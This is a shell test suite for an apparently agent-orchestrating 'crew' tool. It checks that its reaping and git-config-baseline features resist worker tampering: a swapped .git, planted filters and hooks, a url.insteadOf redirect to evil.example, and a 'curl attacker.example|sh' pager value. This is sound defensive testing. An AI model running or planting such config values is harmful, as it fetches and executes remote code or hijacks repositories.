# (wt, crew dir, branch, admin dir) for a linked worktree, so crew's
# _wt_trusted_cwd recognises it.
write_full_anchor_record() {
  local path common
  path="$(anchor_record_path "$1")"
  common="$(git -C "$TEST_REPO" rev-parse --path-format=absolute --git-common-dir)"
  mkdir -p "$(dirname "$path")"
  {
    realpath -e "$1"
    realpath -m "$common/crew"
    printf '%s\n' "$2"
    realpath -e "$(git -C "$1" rev-parse --absolute-git-dir)"
  } >"$path"
}

# make_fake_gitdir <dir> <branch> — a standalone clone of $TEST_REPO with
# <branch> at its origin tip, whose reference-transaction hook touches
# $BATS_TEST_TMPDIR/SENTINEL: the repo a worker's swapped `.git` would name.
make_fake_gitdir() {
  git clone -q "$TEST_REPO" "$1"
  git -C "$1" branch "$2" "origin/$2"
  cat >"$1/.git/hooks/reference-transaction" <<EOF
#!/bin/sh
: >"$BATS_TEST_TMPDIR/SENTINEL"
EOF
  chmod +x "$1/.git/hooks/reference-transaction"
}

@test "reap: the merged-branch delete lands in the real repo when the caller's .git is swapped (#633)" {
  git commit -q --allow-empty -m init
  git branch feat/633-cand
  cand_wt="$BATS_TEST_TMPDIR/633-cand-wt"
  git worktree add -q "$cand_wt" feat/633-cand
  echo unique >"$cand_wt/work.txt"
  git -C "$cand_wt" add work.txt
  git -C "$cand_wt" commit -q -m "cand work"
  git branch feat/633-here
  w1="$BATS_TEST_TMPDIR/633-here-wt"
  git worktree add -q "$w1" feat/633-here
  w1=$(cd "$w1" && pwd -P)
  write_full_anchor_record "$w1" feat/633-here
  scratch="$BATS_TEST_TMPDIR/633-fake"
  make_fake_gitdir "$scratch" feat/633-cand
  stub_tmux "" ""
  # The first headRefOid lookup swaps the caller's .git for the fake, as a
  # worker could at any point during the sweep; it still prints the real tip
  # so a discovery-based `git rev-parse` in the fake agrees with it.
  export SWAP_REPO="$TEST_REPO" SWAP_W1="$w1" SWAP_FAKE="$scratch" SWAP_CAND=feat/633-cand SWAP_MARK="$BATS_TEST_TMPDIR/swapped"
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '99' ;;
*headRefOid*)
  if [ ! -e "$SWAP_MARK" ]; then
    : >"$SWAP_MARK"
    rm -f "$SWAP_W1/.git"
    mv "$SWAP_FAKE/.git" "$SWAP_W1/.git"
  fi
  git -C "$SWAP_REPO" rev-parse "refs/heads/$SWAP_CAND"
  ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/633-cand" done "" "https://example.com/pr/8"
  cd "$w1"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [ -e "$BATS_TEST_TMPDIR/swapped" ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [[ "$output" == *"reaped feat/633-cand"* ]]
  [ ! -d "$cand_wt" ]
  run ! git -C "$TEST_REPO" show-ref --verify --quiet refs/heads/feat/633-cand
}

@test "reap: the branch delete stays anchored when an unrecorded caller's .git is swapped (#633)" {
  git commit -q --allow-empty -m init
  git branch feat/633-cand
  cand_wt="$BATS_TEST_TMPDIR/633-cand-wt"
  git worktree add -q "$cand_wt" feat/633-cand
  echo unique >"$cand_wt/work.txt"
  git -C "$cand_wt" add work.txt
  git -C "$cand_wt" commit -q -m "cand work"
  git branch feat/633-here
  w1="$BATS_TEST_TMPDIR/633-here-wt"
  git worktree add -q "$w1" feat/633-here
  w1=$(cd "$w1" && pwd -P)
  scratch="$BATS_TEST_TMPDIR/633-fake"
  make_fake_gitdir "$scratch" feat/633-cand
  stub_tmux "" ""
  export SWAP_REPO="$TEST_REPO" SWAP_W1="$w1" SWAP_FAKE="$scratch" SWAP_CAND=feat/633-cand SWAP_MARK="$BATS_TEST_TMPDIR/swapped"
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '99' ;;
*headRefOid*)
  if [ ! -e "$SWAP_MARK" ]; then
    : >"$SWAP_MARK"
    rm -f "$SWAP_W1/.git"
    mv "$SWAP_FAKE/.git" "$SWAP_W1/.git"
  fi
  git -C "$SWAP_REPO" rev-parse "refs/heads/$SWAP_CAND"
  ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/633-cand" done "" "https://example.com/pr/8"
  cd "$w1"
  CREW_ID=c1 run run_crew reap --quiet
  [ -e "$BATS_TEST_TMPDIR/swapped" ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  run ! git -C "$TEST_REPO" show-ref --verify --quiet refs/heads/feat/633-cand
  git --git-dir="$w1/.git" show-ref --verify --quiet refs/heads/feat/633-cand
}

@test "reap: keeps the recorded worktree the caller stands in after relocating (#633)" {
  git commit -q --allow-empty -m init
  git branch feat/633-here
  w1="$BATS_TEST_TMPDIR/633-here-wt"
  git worktree add -q "$w1" feat/633-here
  w1=$(cd "$w1" && pwd -P)
  write_full_anchor_record "$w1" feat/633-here
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/633-here" done "" "https://example.com/pr/8"
  cd "$w1"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"it is the current worktree"* ]]
  [ -d "$w1" ]
}

@test "reap: refuses from inside a worker worktree whose .git was swapped (#633)" {
  git commit -q --allow-empty -m init
  git branch feat/633-cand
  cand_wt="$BATS_TEST_TMPDIR/633-cand-wt"
  git worktree add -q "$cand_wt" feat/633-cand
  git branch feat/633-here
  w1="$BATS_TEST_TMPDIR/633-here-wt"
  git worktree add -q "$w1" feat/633-here
  w1=$(cd "$w1" && pwd -P)
  write_full_anchor_record "$w1" feat/633-here
  scratch="$BATS_TEST_TMPDIR/633-fake"
  make_fake_gitdir "$scratch" feat/633-cand
  rm -f "$w1/.git"
  mv "$scratch/.git" "$w1/.git"
  stub_tmux "" ""
  CREW_ID=c1 run_crew status "worker:feat/633-cand" done "" "https://example.com/pr/8"
  cd "$w1"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 1 ]
  [[ "$output" == *"inside the worker worktree"* ]]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$cand_wt" ]
}

# make_filter_fake_gitdir <dir> <marker> — a standalone clone of $TEST_REPO
# whose own attributes select a clean filter that touches <marker>: the repo a
# worker's swapped `.git` would name.
make_filter_fake_gitdir() {
  git clone -q "$TEST_REPO" "$1"
  printf '* filter=x\n' >"$1/.git/info/attributes"
  git -C "$1" config filter.x.clean "$(printf 'touch %q; cat' "$2")"
}

@test "reap: a .git swapped after the gitlink check is never discovered (#677)" {
  # reap checks the worker's gitlink, then trashes scaffold (where the stub
  # swaps .git for a standalone repo) before removing. Any git that discovered
  # the repo from the tree after that would read the fake's config and
  # attributes and run its clean filter on the stat-dirty f.
  printf a >f
  git add f
  git commit -q -m f
  git branch feat/677-a
  wt_path="$BATS_TEST_TMPDIR/677-a-wt"
  git worktree add -q "$wt_path" feat/677-a
  wt_path=$(cd "$wt_path" && pwd -P)
  seed_git_baseline
  : >"$wt_path/WORKER_TASK.md"
  make_filter_fake_gitdir "$BATS_TEST_TMPDIR/677-fake" "$BATS_TEST_TMPDIR/SENTINEL"
  touch -d '+5 seconds' "$wt_path/f"
  stub_tmux "" ""
  export SWAP_WT="$wt_path" SWAP_FAKE="$BATS_TEST_TMPDIR/677-fake" SWAP_MARK="$BATS_TEST_TMPDIR/swapped" SWAP_REPO="$TEST_REPO"
  cat >"$STUB_DIR/gtrash" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
if [ ! -e "$SWAP_MARK" ]; then
  : >"$SWAP_MARK"
  mv "$SWAP_WT/.git" "$SWAP_WT.gitfile"
  mv "$SWAP_FAKE/.git" "$SWAP_WT/.git"
fi
exit 0
EOF
  chmod +x "$STUB_DIR/gtrash"
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
*headRefOid*) git -C "$SWAP_REPO" rev-parse refs/heads/feat/677-a ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  cat >"$STUB_DIR/wt" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
if [ "$1" = remove ]; then
  branch="${!#}"
  wtp=$(git worktree list --porcelain | awk -v b="refs/heads/$branch" '/^worktree /{p=$2} $0=="branch "b{print p}')
  if [ -n "$wtp" ]; then
    git -C "$wtp" status --porcelain >/dev/null 2>&1
    rm -rf "$wtp"
  fi
  git worktree prune
fi
exit 0
EOF
  chmod +x "$STUB_DIR/wt"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/677-a" done "" "https://example.com/pr/677"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ -e "$BATS_TEST_TMPDIR/swapped" ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/677-a — its .git changed during the reap"* ]]
  run ! grep -q '"kind":"reap"' "$log"
}

@test "reap: a .git swapped after the last re-check is refused by the anchored removal (#677)" {
  # The swap fires inside the removal call itself, after every re-check: git's
  # gitfile validation refuses the swapped tree and reap relays the tampering
  # line. The git wrapper also logs any post-swap git that discovers its repo
  # from the tree, which pins the removal (and all after it) as anchored.
  printf a >f
  git add f
  git commit -q -m f
  git branch feat/677-b
  wt_path="$BATS_TEST_TMPDIR/677-b-wt"
  git worktree add -q "$wt_path" feat/677-b
  wt_path=$(cd "$wt_path" && pwd -P)
  seed_git_baseline
  write_anchor_record "$wt_path"
  anchor="$(anchor_record_path "$wt_path")"
  make_filter_fake_gitdir "$BATS_TEST_TMPDIR/677-b-fake" "$BATS_TEST_TMPDIR/SENTINEL"
  touch -d '+5 seconds' "$wt_path/f"
  real_git=$(command -v git)
  stub_tmux "" ""
  export REAL_GIT="$real_git" SWAP_WT="$wt_path" SWAP_FAKE="$BATS_TEST_TMPDIR/677-b-fake" \
    SWAP_SAVE="$BATS_TEST_TMPDIR/real-gitfile" SWAP_MARK="$BATS_TEST_TMPDIR/swapped" SWAP_REPO="$TEST_REPO"
  cat >"$STUB_DIR/git" <<'EOF2'
#!/usr/bin/env bash
if [ ! -e "$SWAP_MARK" ] && [ "${!#}" = "$SWAP_WT" ]; then
  prev=
  for arg in "$@"; do
    if [ "$prev" = worktree ] && [ "$arg" = remove ]; then
      : >"$SWAP_MARK"
      mv "$SWAP_WT/.git" "$SWAP_SAVE"
      mv "$SWAP_FAKE/.git" "$SWAP_WT/.git"
      break
    fi
    prev=$arg
  done
fi
if [ -e "$SWAP_MARK" ] && [ -z "${GIT_DIR:-}" ]; then
  anchored= in_wt=
  case "$PWD/" in "$SWAP_WT"/*) in_wt=1 ;; esac
  prev=
  for arg in "$@"; do
    case "$arg" in --git-dir=*) anchored=1 ;; esac
    if [ "$prev" = -C ]; then
      case "$arg/" in "$SWAP_WT"/*) in_wt=1 ;; esac
    fi
    prev=$arg
  done
  if [ -z "$anchored" ] && [ -n "$in_wt" ]; then
    printf '%s\n' "$*" >>"$BATS_TEST_TMPDIR/discovered"
  fi
fi
exec "$REAL_GIT" "$@"
EOF2
  chmod +x "$STUB_DIR/git"
  cat >"$STUB_DIR/gh" <<'EOF2'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
*headRefOid*) "$REAL_GIT" -C "$SWAP_REPO" rev-parse refs/heads/feat/677-b ;;
esac
exit 0
EOF2
  chmod +x "$STUB_DIR/gh"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/677-b" done "" "https://example.com/pr/677"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ -e "$BATS_TEST_TMPDIR/swapped" ]
  [ ! -e "$BATS_TEST_TMPDIR/SENTINEL" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/677-b — its .git changed during the reap"* ]]
  [ ! -e "$BATS_TEST_TMPDIR/discovered" ]
  [ -e "$anchor" ]
  run ! grep -q '"kind":"reap"' "$log"
}

@test "reap: a gitlink staged after the first submodule gate keeps the worktree (#677)" {
  # --force skips git's own submodule refusal and the status re-check hides
  # gitlinks, so the pre-removal re-check must look at the index again. The
  # gtrash stub, like the real one, removes what it is given, and stages a
  # gitlink over a fresh embedded repo between the first gate and the re-check.
  git commit -q --allow-empty -m init
  git branch feat/677-c
  wt_path="$BATS_TEST_TMPDIR/677-c-wt"
  git worktree add -q "$wt_path" feat/677-c
  wt_path=$(cd "$wt_path" && pwd -P)
  : >"$wt_path/WORKER_TASK.md"
  stub_tmux "" ""
  export SWAP_WT="$wt_path" SWAP_MARK="$BATS_TEST_TMPDIR/staged" SWAP_REPO="$TEST_REPO"
  SWAP_ADMIN=$(git -C "$wt_path" rev-parse --absolute-git-dir)
  export SWAP_ADMIN
  cat >"$STUB_DIR/gtrash" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
if [ ! -e "$SWAP_MARK" ]; then
  : >"$SWAP_MARK"
  git init -q "$SWAP_WT/sub"
  git --git-dir="$SWAP_ADMIN" --work-tree="$SWAP_WT" update-index --add \
    --cacheinfo "160000,$(git -C "$SWAP_REPO" rev-parse HEAD),sub"
fi
rm -f -- "${@:2}"
exit 0
EOF
  chmod +x "$STUB_DIR/gtrash"
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/677-c" done "" "https://example.com/pr/677"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ -e "$BATS_TEST_TMPDIR/staged" ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/677-c — it has submodules"* ]]
  [ -d "$wt_path/sub/.git" ]
  run ! grep -q '"kind":"reap"' "$log"
}

@test "reap: a removal that fails partway is reported, not called tampering (#677)" {
  # git deletes the admin dir even when part of the tree cannot go, so the
  # tree's gitlink then fails to resolve without any tampering.
  [ "$(id -u)" != 0 ] || skip "root ignores directory permissions"
  git commit -q --allow-empty -m init
  git branch feat/677-d
  wt_path="$BATS_TEST_TMPDIR/677-d-wt"
  git worktree add -q "$wt_path" feat/677-d
  wt_path=$(cd "$wt_path" && pwd -P)
  printf 'ro/\n' >>"$TEST_REPO/.git/info/exclude"
  mkdir "$wt_path/ro"
  : >"$wt_path/ro/f"
  RESTORE_WRITE="$wt_path"
  chmod 0555 "$wt_path/ro"
  write_anchor_record "$wt_path"
  anchor="$(anchor_record_path "$wt_path")"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/677-d" done "" "https://example.com/pr/677"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/677-d — removal failed partway; $wt_path is no longer a worktree"* ]]
  [[ "$output" != *"possible tampering"* ]]
  [ ! -e "$anchor" ]
  run ! grep -q '"kind":"reap"' "$log"
}

@test "git-baseline --accept refuses without a tty (#585)" {
  # --accept exists for a human eyeballing a diff of newly-seen exec-capable
  # keys and widening the baseline on purpose; run non-interactively (no tty
  # on stdin) it must refuse rather than silently widen the baseline to
  # whatever config happens to be sitting there.
  git commit -q --allow-empty -m init
  B="$TEST_REPO/.git/crew/git-config-baseline"
  git config core.sshCommand "$BATS_TEST_TMPDIR/hit.sh"
  before=$(cksum "$B")
  run run_crew git-baseline --accept </dev/null
  [ "$status" -eq 1 ]
  [[ "$output" == *"own terminal"* ]]
  [ "$(cksum "$B")" = "$before" ]

  rm "$B"
  run run_crew git-baseline --accept </dev/null
  [ "$status" -eq 1 ]
  [ ! -e "$B" ]
}

# crew_tty <answer> <crew args...> — run crew on a real pty (a private tmux
# server) and type <answer> at its `type yes` prompt; sets $status/$output.
crew_tty() {
  local answer="$1" sock="tty-$BATS_TEST_NUMBER" out="$BATS_TEST_TMPDIR/tty.out"
  local rc="$BATS_TEST_TMPDIR/tty.rc" script="$BATS_TEST_TMPDIR/tty.sh" i
  shift
  [ -n "$REAL_TMUX" ] || skip "tmux not installed"
  rm -f "$out" "$rc"
  printf 'bash -euo pipefail %q' "$CREW" >"$script"
  printf ' %q' "$@" >>"$script"
  printf ' >%q 2>&1\necho $? >%q\n' "$out" "$rc" >>"$script"
  "$REAL_TMUX" -L "$sock" -f /dev/null new-session -d -x 200 -y 50 -c "$PWD" "bash $script"
  for ((i = 0; i < 100; i++)); do
    if [ -e "$rc" ] || grep -q 'type yes' "$out" 2>/dev/null; then break; fi
    sleep 0.1
  done
  [ -e "$rc" ] || "$REAL_TMUX" -L "$sock" send-keys -l "$answer"
  [ -e "$rc" ] || "$REAL_TMUX" -L "$sock" send-keys Enter
  for ((i = 0; i < 100; i++)); do
    if [ -s "$rc" ]; then break; fi
    sleep 0.1
  done
  "$REAL_TMUX" -L "$sock" kill-server 2>/dev/null || true
  status="$(cat "$rc")"
  output="$(cat "$out")"
}

@test "git-baseline never records a missing baseline (#557)" {
  # #557: only a dispatch records the baseline (TOFU before any worker of the
  # crew exists); a later review run must not trust whatever is there now.
  git commit -q --allow-empty -m init
  rm "$TEST_REPO/.git/crew/git-config-baseline"
  git config core.sshCommand "$BATS_TEST_TMPDIR/hit.sh"
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *"none yet"* ]]
  [[ "$output" == *"the next dispatch records it"* ]]
  [[ "$output" == *"crew git-baseline --accept"* ]]
  [ ! -e "$TEST_REPO/.git/crew/git-config-baseline" ]
}

@test "git-baseline exits 0 without drift and 1 listing drifted keys (#557)" {
  git commit -q --allow-empty -m init
  seed_git_baseline
  run run_crew git-baseline
  [ "$status" -eq 0 ]
  [[ "$output" == *"no drift"* ]]
  git config core.sshCommand "$BATS_TEST_TMPDIR/hit.sh"
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *"core.sshcommand=$BATS_TEST_TMPDIR/hit.sh (main checkout, "* ]]
  before="$(cksum "$TEST_REPO/.git/crew/git-config-baseline")"
  run run_crew git-baseline extra
  [ "$status" -eq 1 ]
  [[ "$output" == *"git-baseline [--accept]"* ]]
  [ "$(cksum "$TEST_REPO/.git/crew/git-config-baseline")" = "$before" ]
  run run_crew git-baseline --accept extra
  [ "$status" -eq 1 ]
  [[ "$output" == *"git-baseline [--accept]"* ]]
  [ "$(cksum "$TEST_REPO/.git/crew/git-config-baseline")" = "$before" ]
}

@test "git-baseline treats relative and absolute .git/hooks as one baselined dir (#628)" {
  git commit -q --allow-empty -m init
  git worktree add -q "$BATS_TEST_TMPDIR/w" -b w
  abs="$(git rev-parse --path-format=absolute --git-common-dir)/hooks"
  git config core.hooksPath "$abs"
  seed_git_baseline
  git config core.hooksPath .git/hooks
  run run_crew git-baseline
  [ "$status" -eq 0 ]
  [[ "$output" == *"no drift"* ]]
  git config core.hooksPath .git/hooks
  seed_git_baseline
  git config core.hooksPath "$abs"
  run run_crew git-baseline
  [ "$status" -eq 0 ]
  [[ "$output" == *"no drift"* ]]
  git config core.hooksPath .git/hooks-evil
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *"core.hookspath=.git/hooks-evil (main checkout, "* ]]
}

@test "git-baseline prints worker-controlled bytes escaped (#557)" {
  # #557: a raw ESC/CR in a key, value or origin could redraw the terminal
  # and disguise what drifted.
  git commit -q --allow-empty -m init
  seed_git_baseline
  git config filter.x.clean "evil"$'\e[2K\r'"cat"
  git config "filter.a"$'\e'"[2Kb.smudge" cat
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *filter.x.clean* ]]
  [[ "$output" == *filter.a* ]]
  [[ "$output" != *$'\e'* ]]
  [[ "$output" != *$'\r'* ]]
}

@test "git-baseline --accept merges into the baseline (#585)" {
  # The run shows only the drift; a replacing accept would drop the pairs
  # already accepted.
  git commit -q --allow-empty -m init
  git config core.hooksPath .git/hooks
  seed_git_baseline
  git config core.sshCommand "$BATS_TEST_TMPDIR/hit.sh"
  crew_tty yes git-baseline --accept
  [ "$status" -eq 0 ]
  [[ "$output" == *"core.sshcommand=$BATS_TEST_TMPDIR/hit.sh"* ]]
  [[ "$output" != *core.hookspath* ]]
  grep -q core.hookspath "$TEST_REPO/.git/crew/git-config-baseline"
  run run_crew git-baseline
  [ "$status" -eq 0 ]
  [[ "$output" == *"no drift"* ]]
}

@test "git-baseline --accept without a baseline shows every pair, records on yes (#585)" {
  git commit -q --allow-empty -m init
  rm "$TEST_REPO/.git/crew/git-config-baseline"
  git config core.sshCommand "$BATS_TEST_TMPDIR/hit.sh"
  B="$TEST_REPO/.git/crew/git-config-baseline"
  crew_tty no git-baseline --accept
  [ "$status" -eq 1 ]
  [[ "$output" == *core.sshcommand=* ]]
  [ ! -e "$B" ]
  crew_tty yes git-baseline --accept
  [ "$status" -eq 0 ]
  [[ "$output" == *core.sshcommand=* ]]
  grep -q core.sshcommand "$B"
  run run_crew git-baseline
  [ "$status" -eq 0 ]
}

@test "git-baseline --accept with no pairs writes a marker-only baseline (#585, #678)" {
  git commit -q --allow-empty -m init
  B="$TEST_REPO/.git/crew/git-config-baseline"
  rm "$B"
  crew_tty yes git-baseline --accept
  [ "$status" -eq 0 ]
  mapfile -d '' recs <"$B"
  [ "${#recs[@]}" -eq 1 ]
  [ "${recs[0]}" = $'#covers\nredirect' ]
  run run_crew git-baseline
  [ "$status" -eq 0 ]
  [[ "$output" == *"no drift"* ]]
}

@test "git-baseline lists a planted url insteadOf redirect (#678)" {
  git commit -q --allow-empty -m init
  seed_git_baseline
  git config "url.https://evil.example/.insteadOf" "https://github.com/"
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *"url.https://evil.example/.insteadof=https://github.com/ (main checkout, "* ]]
}

@test "git-baseline shows an exec value verbatim: the payload before an @ stays visible (#678)" {
  git commit -q --allow-empty -m init
  seed_git_baseline
  git config core.pager 'curl -s attacker.example|sh;: a@less'
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *attacker.example* ]]
}

@test "git-baseline shows an exec value verbatim that looks like a URL (#678)" {
  git commit -q --allow-empty -m init
  seed_git_baseline
  git config core.pager 'x://curl attacker.example|sh;:@less'
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *attacker.example* ]]
}

@test "git-baseline shows a bracketed ssh userinfo host verbatim (#678)" {
  git commit -q --allow-empty -m init
  git config remote.origin.url https://github.com/o/r.git
  seed_git_baseline
  git config remote.origin.url 'ssh://[evil.example]:22@github.com/o/r.git'
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *evil.example* ]]
}

@test "git-baseline shows an scp-style remote url raw, so its host stays visible (#678)" {
  git commit -q --allow-empty -m init
  git config remote.origin.url https://github.com/o/r.git
  seed_git_baseline
  git config remote.origin.url 'attacker.example:x@github.com:o/r.git'
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *remote.origin.url=attacker.example:x@github.com:o/r.git* ]]
}

@test "git-baseline notes a baseline that predates redirect-key coverage (#678)" {
  git commit -q --allow-empty -m init
  : >"$TEST_REPO/.git/crew/git-config-baseline"
  git config remote.origin.url https://x.example/r.git
  run run_crew git-baseline
  [ "$status" -eq 1 ]
  [[ "$output" == *"predates redirect-key coverage"* ]]
  [[ "$output" == *"next dispatch"* ]]
  [[ "$output" == *"--accept"* ]]
  [[ "${output%%remote.origin.url=*}" == *"predates redirect-key coverage"* ]]
  [[ "$output" == *"remote.origin.url=https://x.example/r.git"* ]]
}

@test "git-baseline --accept records the redirect marker (#678)" {
  git commit -q --allow-empty -m init
  B="$TEST_REPO/.git/crew/git-config-baseline"
  : >"$B"
  git config remote.origin.url https://x.example/r.git
  crew_tty yes git-baseline --accept
  [ "$status" -eq 0 ]
  mapfile -d '' recs <"$B"
  [[ " ${recs[*]} " == *$'#covers\nredirect'* ]]
  run run_crew git-baseline
  [ "$status" -eq 0 ]
  [[ "$output" == *"no drift"* ]]
  [[ "$output" != *"predates"* ]]
}

@test "git-baseline --accept repairs a lone-NUL baseline (#585)" {
  git commit -q --allow-empty -m init
  B="$TEST_REPO/.git/crew/git-config-baseline"
  printf '\0' >"$B"
  git config core.sshCommand x
  crew_tty yes git-baseline --accept
  [ "$status" -eq 0 ]
  mapfile -d '' recs <"$B"
  for rec in "${recs[@]}"; do
    [ -n "$rec" ]
  done
  printf '%s\n' "${recs[@]}" | grep -qx core.sshcommand
  [[ " ${recs[*]} " == *"core.sshcommand"$'\n'"x"* ]]
}

@test "git-baseline --accept writes only displayed pairs (#585)" {
  git commit -q --allow-empty -m init
  B="$TEST_REPO/.git/crew/git-config-baseline"
  git worktree add -q "$BATS_TEST_TMPDIR/w" -b w
  REAL_GIT="$(command -v git)"
  CTR="$BATS_TEST_TMPDIR/ctr"
  mkdir -p "$BATS_TEST_TMPDIR/shim"
  cat >"$BATS_TEST_TMPDIR/shim/git" <<EOF
#!/usr/bin/env bash
"$REAL_GIT" "\$@"; rc=\$?
case " \$* " in *" config --list "*)
  n=\$(( \$(cat "$CTR" 2>/dev/null || echo 0) + 1 )); echo "\$n" >"$CTR"
  "$REAL_GIT" -C "$TEST_REPO" config core.fsmonitor "/evil\$n" ;;
esac
exit \$rc
EOF
  chmod +x "$BATS_TEST_TMPDIR/shim/git"
  export PATH="$BATS_TEST_TMPDIR/shim:$PATH"
  crew_tty yes git-baseline --accept
  [ "$status" -eq 0 ]
  last=$(cat "$CTR")
  mapfile -d '' recs <"$B"
  seen_fsmonitor=0
  planted="core.fsmonitor"$'\n'"/evil$last"
  for rec in "${recs[@]}"; do
    [[ $rec == core.fsmonitor$'\n'* ]] || continue
    seen_fsmonitor=1
    [[ "$output" == *"core.fsmonitor=${rec#*$'\n'}"* ]]
    [ "$rec" != "$planted" ]
  done
  [ "$seen_fsmonitor" -eq 1 ]
}

@test "reap: no baseline keeps the worktree and records none (#557)" {
  # #557: reap runs once workers exist, so it must never record a baseline.
  git commit -q --allow-empty -m init
  rm "$TEST_REPO/.git/crew/git-config-baseline"
  git branch feat/557-e
  wt_path="$BATS_TEST_TMPDIR/557-e-wt"
  git worktree add -q "$wt_path" feat/557-e
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF2'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF2
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/557-e" done "" "https://example.com/pr/557"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [ -d "$wt_path" ]
  [[ "$output" == *"keeping feat/557-e"* ]]
  [ ! -e "$TEST_REPO/.git/crew/git-config-baseline" ]
}

@test "reap: a live engine pane keeps a terminal, merged-PR worktree" {
  # Widening the terminal-state filter (defect 1) must not let an exited
  # worker whose PR merged get reclaimed out from under a human (or another
  # session) still sitting at the pane. The live-pane check runs unconditionally,
  # after the terminal-state filter, so it must still guard exited/failed the
  # same way it already guarded done.
  git commit -q --allow-empty -m init
  git branch feat/live-engine-me
  wt_path="$BATS_TEST_TMPDIR/live-engine-wt"
  git worktree add -q "$wt_path" feat/live-engine-me
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note in the idle-release tests
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  stub_tmux_frames "" "$(printf '@1\t%%1\tclaude\t%s\n' "$wt_path")"
  CREW_ID=c1 run_crew status "worker:feat/live-engine-me" exited "" "https://example.com/pr/25"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/live-engine-me — an engine is still running there"* ]]
  [ -d "$wt_path" ]
  run ! grep -q 'remove' "$STUB_LOG"
}

@test "reap: an exited worker with no PR is kept" {
  # Same guard as the long-standing "done but no PR" keep, now exercised for
  # a state defect 1 newly admits into the candidate pool.
  git commit -q --allow-empty -m init
  git branch feat/exited-no-pr
